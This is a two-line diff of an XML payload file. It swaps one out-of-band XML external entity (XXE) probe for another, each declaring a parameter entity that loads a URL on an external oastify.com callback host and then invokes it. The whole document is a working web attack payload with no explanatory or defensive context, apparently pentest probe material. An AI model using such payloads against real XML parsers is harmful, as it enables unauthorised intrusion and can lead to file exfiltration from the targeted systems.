@@ -1,2 +1,2 @@
-<!ENTITY % xxe SYSTEM "http://k3oxushregaphrw43ievhnmia9g74xsm.oastify.com/xxe-test">
-%xxe;
+<!ENTITY % test SYSTEM "http://k3oxushregaphrw43ievhnmia9g74xsm.oastify.com/basic-test">
+%test;
